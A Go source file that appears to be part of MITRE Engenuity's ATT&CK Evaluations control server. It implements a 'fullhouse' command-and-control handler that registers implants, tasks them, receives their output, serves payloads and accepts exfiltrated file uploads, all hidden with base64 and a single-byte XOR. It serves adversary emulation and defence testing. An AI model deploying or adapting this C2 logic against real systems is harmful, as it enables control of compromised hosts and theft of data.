package fullhouse

import (
    "context"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net/http"
    "strings"
    "time"

    "attackevals.mitre-engenuity.org/control_server/config"
    "attackevals.mitre-engenuity.org/control_server/handlers/base_handler"
    "attackevals.mitre-engenuity.org/control_server/handlers/handler_manager"
    "attackevals.mitre-engenuity.org/control_server/handlers/handler_util"

    "github.com/gorilla/mux"
)

const (
    SERVER_ERR_MSG = "Internal server error\n"
    HANDLER_NAME   = "fullhouse"
    heartbeatResp  = "{\"id\": 0}"
)

var (
    xorKey = []byte("F")
)

type fullhouseHandler struct {
    baseHandler        *base_handler.BaseHandlerUtil
    wrappedFuncHandles *WrappedFuncHandles

    // to be initialized after init()
    server *http.Server
}

type WrappedFuncHandles struct {
    randStringGetter handler_util.RandAlphanumericStringGetter
}

// Factory method for creating an example C2 handler
func fullhouseHandlerFactory(funcHandles *WrappedFuncHandles) *fullhouseHandler {
    baseHandler := base_handler.BaseHandlerFactory(HANDLER_NAME)

    return &fullhouseHandler{
        baseHandler:        baseHandler,
        wrappedFuncHandles: funcHandles,
    }
}

// Creates and adds the example C2 handler to the map of available C2 handlers.
func init() {
    // use production function wrappers
    wrappedFuncHandles := &WrappedFuncHandles{
        randStringGetter: handler_util.GetRandomAlphanumericString,
    }
    handler_manager.RegisterAvailableHandler(fullhouseHandlerFactory(wrappedFuncHandles))
}

func (f *fullhouseHandler) GetName() string {
    return HANDLER_NAME
}

// StartHandler starts the C2 handler
func (f *fullhouseHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {

    // set the bind and REST API addresses for the base handler
    err := f.baseHandler.SetBindAddr(configEntry)
    if err != nil {
        return err
    }
    f.baseHandler.SetRestApiAddr(restAddress)
    f.baseHandler.HandlerLogInfo("Starting %s Handler to listen on %s", f.baseHandler.Name, f.baseHandler.BindAddr)

    // initialize URL router
    urlRouter := mux.NewRouter()

    // bind HTTP routes to their functions - these functions handle things like fetching tasks and files, uploading task results and files
    urlRouter.HandleFunc("/request/{identifier}", f.HandleGetTask).Methods("GET", "POST")
    urlRouter.HandleFunc("/form/{identifier}", f.HandleTaskResponse).Methods("POST")
    urlRouter.HandleFunc("/files/{filename}", f.HandlePayloadDownload).Methods("GET")
    urlRouter.HandleFunc("/submit", f.HandleFileUpload).Methods("POST")

    f.server = &http.Server{
        Addr:         f.baseHandler.BindAddr,
        WriteTimeout: time.Second * 15,
        ReadTimeout:  time.Second * 15,
        IdleTimeout:  time.Second * 60,
        Handler:      urlRouter,
    }

    // start handler in goroutine so it doesn't block
    go func() {
        err := f.server.ListenAndServe()
        if err != nil && err.Error() != "http: Server closed" {
            f.baseHandler.HandlerLogError(err.Error())
        }
    }()

    return nil
}

// StopHandler stops the C2 handler
func (f *fullhouseHandler) StopHandler() error {
    f.baseHandler.HandlerLogInfo("Stopping %s Handler", f.baseHandler.Name)
    emptyContext := context.Background()
    return f.server.Shutdown(emptyContext)
}

// Handle GET requests for current implant task / heartbeat
func (f *fullhouseHandler) HandleGetTask(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    implantId, ok := vars["identifier"]
    var err error
    task := ""
    if !ok {
        f.baseHandler.HandlerLogError("handleGetTask: Request identifier not included in GET request.")
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    // Check if we have seen this implant before - if not, create a new session for it
    if !f.baseHandler.HasImplantSession(implantId) {
        f.baseHandler.HandlerLogInfo("Received first-time task request from %s. Creating session.", implantId)

        // Read/Decode POST body and parse session data
        b64PostBody, err := ioutil.ReadAll(r.Body)
        if err != nil {
            f.baseHandler.HandlerLogError(fmt.Sprintf("Failed to read POST body: %s", err.Error()))
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(SERVER_ERR_MSG))
            return
        }
        xorPostBody, _ := base64.StdEncoding.DecodeString(string(b64PostBody))
        postBody := string(xor(xorPostBody))

        splitPostBody := strings.Split(string(postBody), "\n")
        if len(splitPostBody) != 3 {
            f.baseHandler.HandlerLogError("Session data invalid for implant ID: %s", implantId)
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(SERVER_ERR_MSG))
            return
        }
        user, host, pid := splitPostBody[0], splitPostBody[1], splitPostBody[2]

        sessionData := map[string]string{"guid": implantId, "user": user, "hostName": host, "pid": pid}
        err = f.baseHandler.RegisterNewImplant(implantId, sessionData)
        if err != nil {
            f.baseHandler.HandlerLogError("Failed to register implant session for implant ID %s: %s", implantId, err.Error())
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(SERVER_ERR_MSG))
            return
        }

    } else {
        f.baseHandler.HandlerLogDebug("Received task request from %s", implantId)
        task, err = f.baseHandler.GetImplantTask(implantId)
        if err != nil {
            f.baseHandler.HandlerLogError("Failed to get task for implant ID %s: %s", implantId, err.Error())
            w.WriteHeader(http.StatusInternalServerError)
            w.Write([]byte(SERVER_ERR_MSG))
            return
        }
    }

    // Set task response to heartbeat if no task available
    if task == "" {
        task = heartbeatResp
    }

    // Base64 encode and XOR the task response
    encodedTask := base64.StdEncoding.EncodeToString(xor([]byte(task)))

    f.baseHandler.HandlerLogInfo("Tasking implant %s with task: %s", implantId, task)
    w.Write([]byte(encodedTask))
}

// Handle POST requests for task output
func (f *fullhouseHandler) HandleTaskResponse(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    implantId := vars["identifier"]
    b64Resp, err := ioutil.ReadAll(r.Body)
    if err != nil {
        f.baseHandler.HandlerLogError("Failed to read task response for implant ID %s: %s", implantId, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    // Decode/decrypt data from implant to get the task output
    xorResp, _ := base64.StdEncoding.DecodeString(string(b64Resp))
    resp := xor(xorResp)

    f.baseHandler.HandlerLogInfo("Received task response from %s. Registering task output.", implantId)
    _, err = f.baseHandler.RegisterTaskOutput(implantId, resp)
    if err != nil {
        f.baseHandler.HandlerLogError("Failed to register response for implant ID %s: %s", implantId, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    // Base64 encode and XOR the task response
    encodedResp := base64.StdEncoding.EncodeToString(xor([]byte(heartbeatResp)))

    fmt.Fprint(w, encodedResp)
}

// Handle GET requests for payload downloads
func (f *fullhouseHandler) HandlePayloadDownload(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    filename := vars["filename"]
    f.baseHandler.HandlerLogInfo("Received file download request for file: %s", filename)

    // Get file bytes
    fileData, err := f.baseHandler.GetFileFromRestServer(filename)
    if err != nil {
        f.baseHandler.HandlerLogError("Failed to perform file download request for file %s: %s", filename, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    // Create payload response, base64 encode, & XOR the data
    response, err := json.Marshal(map[string]interface{}{"file_bytes": base64.StdEncoding.EncodeToString(fileData), "file_size": len(fileData)})
    encodedResp := base64.StdEncoding.EncodeToString(xor(response))

    // Send payload data to implant
    w.Write([]byte(encodedResp))

    f.baseHandler.HandlerLogSuccess("Sent file %s", filename)
}

// Handle POST requests for file uploads
// Expects the destination filename to be the value for the header "filename".
// If no filename is provided, the file will be saved under a random filename
func (f *fullhouseHandler) HandleFileUpload(w http.ResponseWriter, r *http.Request) {
    filename := r.Header.Get("filename")
    if len(filename) == 0 {
        filename = f.wrappedFuncHandles.randStringGetter(7)
        f.baseHandler.HandlerLogInfo("Received file upload request without a destination filename header. Generated random filename %s as the destination.", filename)
    } else {
        f.baseHandler.HandlerLogInfo("Received file upload request to upload file as %s.", filename)
    }

    // Get upload data
    b64PostBody, err := ioutil.ReadAll(r.Body)
    if err != nil {
        f.baseHandler.HandlerLogError("Failed to read POST body for file upload request: %s", err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    // Base64 decode & XOR post body
    xorPostBody, _ := base64.StdEncoding.DecodeString(string(b64PostBody))
    postBody, _ := base64.StdEncoding.DecodeString(string(xor(xorPostBody)))

    // Save file via REST API
    _, err = f.baseHandler.SaveUploadedFile(filename, postBody)
    if err != nil {
        f.baseHandler.HandlerLogError("Failed to save file %s: %s", filename, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }
    f.baseHandler.HandlerLogSuccess("Successfully saved uploaded file as %s", filename)

    encodedResp := base64.StdEncoding.EncodeToString(xor([]byte(heartbeatResp)))
    w.Write([]byte(encodedResp))
}

// XORs the byte array with the XOR key
func xor(data []byte) []byte {
    xorData := make([]byte, len(data))
    for i := range data {
        xorData[i] = data[i] ^ xorKey[0]
    }
    return xorData
}
